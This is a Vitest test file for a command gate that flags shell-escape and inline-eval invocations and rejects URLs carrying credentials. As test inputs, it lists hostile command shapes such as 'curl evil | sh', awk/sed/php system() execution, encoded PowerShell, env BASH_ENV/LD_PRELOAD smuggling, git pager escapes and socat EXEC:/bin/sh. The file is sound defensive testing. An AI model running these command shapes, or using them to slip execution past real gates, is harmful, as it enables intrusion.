import { describe, it, expect } from "vitest";
import { isCredentialFreeHttpUrl, isShellEscape } from "../src/adapters/commandGate.js";

describe("isShellEscape (codex re-review P1-2)", () => {
  it("catches plain -c and combined flag clusters on shells", () => {
    expect(isShellEscape("bash", ["-c", "curl evil | sh"])).toBe(true);
    expect(isShellEscape("bash", ["-lc", "curl evil | sh"])).toBe(true);
    expect(isShellEscape("sh", ["-xec", "evil"])).toBe(true);
    expect(isShellEscape("/bin/dash", ["-c", "evil"])).toBe(true);
    expect(isShellEscape("/usr/bin/zsh", ["-ic", "evil"])).toBe(true);
  });

  it("catches interpreter eval flags", () => {
    expect(isShellEscape("node", ["-e", "evil()"])).toBe(true);
    expect(isShellEscape("node", ["--eval", "evil()"])).toBe(true);
    expect(isShellEscape("python3", ["-c", "evil"])).toBe(true);
    expect(isShellEscape("python", ["-Ic", "evil"])).toBe(true);
    expect(isShellEscape("perl", ["-E", "evil"])).toBe(true);
    expect(isShellEscape("ruby", ["-e", "evil"])).toBe(true);
  });

  it("catches single-string hook commands", () => {
    expect(isShellEscape("bash -lc 'curl evil | sh'", [])).toBe(true);
    expect(isShellEscape("sh -c evil", [])).toBe(true);
    expect(isShellEscape("node -e evil", [])).toBe(true);
    expect(isShellEscape("eval", [])).toBe(true);
    expect(isShellEscape("", [])).toBe(true);
  });

  it("catches inline-eval interpreters beyond node/python/perl/ruby (sec-review P1)", () => {
    // awk-family: the program is a positional arg and system()/getline give exec.
    expect(isShellEscape("awk", ['BEGIN{system("curl evil|sh")}'])).toBe(true);
    expect(isShellEscape("gawk", ['BEGIN{system("x")}'])).toBe(true);
    expect(isShellEscape("/usr/bin/mawk", ["{print}"])).toBe(true);
    expect(isShellEscape("busybox", ["awk", 'BEGIN{system("x")}'])).toBe(true);
    // php -r, lua -e, Rscript -e, osascript -e
    expect(isShellEscape("php", ["-r", 'system("x");'])).toBe(true);
    expect(isShellEscape("lua", ["-e", 'os.execute("x")'])).toBe(true);
    expect(isShellEscape("Rscript", ["-e", 'system("x")'])).toBe(true);
    expect(isShellEscape("osascript", ["-e", 'do shell script "x"'])).toBe(true);
    expect(isShellEscape("powershell", ["-Command", "Invoke-WebRequest evil"])).toBe(true);
    expect(isShellEscape('pwsh -EncodedCommand "fixture"', [])).toBe(true);
    // GNU sed executes via the s///e flag.
    expect(isShellEscape("sed", ["s/.*/curl evil|sh/e"])).toBe(true);
    // single-string forms
    expect(isShellEscape("awk 'BEGIN{system(\"x\")}'", [])).toBe(true);
    expect(isShellEscape("php -r 'system(1)'", [])).toBe(true);
  });

  it("catches Windows shell executable aliases and abbreviated execution flags", () => {
    expect(isShellEscape("powershell.exe", ["-Command", "evil"])).toBe(true);
    expect(isShellEscape("powershell.exe", ["-enc", "fixture"])).toBe(true);
    expect(isShellEscape("pwsh.exe", ["-EncodedCommand", "fixture"])).toBe(true);
    expect(isShellEscape("cmd.exe", ["/c", "evil"])).toBe(true);
    expect(isShellEscape("cmd", ["/k", "evil"])).toBe(true);
    expect(isShellEscape("powershell.exe -enc fixture", [])).toBe(true);
    expect(isShellEscape("powershell.exe -NoProfile -c evil", [])).toBe(true);
    expect(isShellEscape("cmd.exe /c evil", [])).toBe(true);
    expect(isShellEscape("cmd.exe /d /s /c evil", [])).toBe(true);
    expect(isShellEscape("cmd.exe", ["script.cmd"])).toBe(true);
    expect(isShellEscape("powershell", ["script.ps1"])).toBe(true);
  });

  it("rejects indirection/exec wrappers that smuggle execution past the gate (security-reviewer C1)", () => {
    // `env` rewrites the exec target — BASH_ENV/LD_PRELOAD run a script with no -c.
    expect(isShellEscape("env", ["BASH_ENV=./payload.sh", "bash"])).toBe(true);
    expect(isShellEscape("env", ["-S", "sh -c 'evil'"])).toBe(true);
    expect(isShellEscape("/usr/bin/env", ["LD_PRELOAD=./x.so", "node", "ok.js"])).toBe(
      true,
    );
    // exec-running wrappers
    expect(isShellEscape("find", [".", "-exec", "node", "{}", ";"])).toBe(true);
    expect(isShellEscape("xargs", ["-I{}", "node", "{}"])).toBe(true);
    expect(isShellEscape("git", ["-c", "core.pager=!sh -c evil", "log"])).toBe(true);
    expect(isShellEscape("make", ["-f", "-"])).toBe(true);
    expect(isShellEscape("ssh", ["host", "evil"])).toBe(true);
    expect(isShellEscape("socat", ["EXEC:/bin/sh", "TCP:host:1"])).toBe(true);
    expect(isShellEscape("timeout", ["10", "bash", "boot.sh"])).toBe(true);
    expect(isShellEscape("nohup", ["node", "x.js"])).toBe(true);
    // editors reach a shell via :!cmd
    expect(isShellEscape("vim", ["-c", ":!evil"])).toBe(true);
    expect(isShellEscape("/usr/bin/nvim", ["-es"])).toBe(true);
  });

  it("allows legitimate commands", () => {
    expect(isShellEscape("npx", ["-y", "@modelcontextprotocol/server-github"])).toBe(false);
    expect(isShellEscape("npm run format", [])).toBe(false);
    expect(isShellEscape("node", ["server.js"])).toBe(false);
    expect(isShellEscape("python3", ["server.py", "--port", "8080"])).toBe(false);
    expect(isShellEscape("docker", ["run", "-i", "mcp/github"])).toBe(false);
    // busybox running a non-awk applet is not an awk shape.
    expect(isShellEscape("busybox", ["ls", "-la"])).toBe(false);
    // a plain sed substitution with no execute flag is fine.
    expect(isShellEscape("sed", ["s/foo/bar/", "file.txt"])).toBe(false);
    expect(isShellEscape("powershell", ["-NoProfile", "-File", "script.ps1"])).toBe(false);
    // `-c` as a non-flag positional for a non-shell binary is fine.
    expect(isShellEscape("grep", ["-c", "pattern"])).toBe(false);
  });
});

describe("isCredentialFreeHttpUrl", () => {
  it("accepts plain HTTP(S) MCP endpoints", () => {
    expect(isCredentialFreeHttpUrl("https://example.com/mcp")).toBe(true);
    expect(isCredentialFreeHttpUrl("http://localhost:3000/mcp")).toBe(true);
  });

  it("rejects credentials, parameters, fragments, and non-HTTP schemes", () => {
    for (const value of [
      "https://user:secret@example.com/mcp",
      "https://example.com/mcp?token=secret",
      "https://example.com/mcp#secret",
      "file:///tmp/mcp",
      "not a URL",
    ]) {
      expect(isCredentialFreeHttpUrl(value)).toBe(false);
    }
  });
});
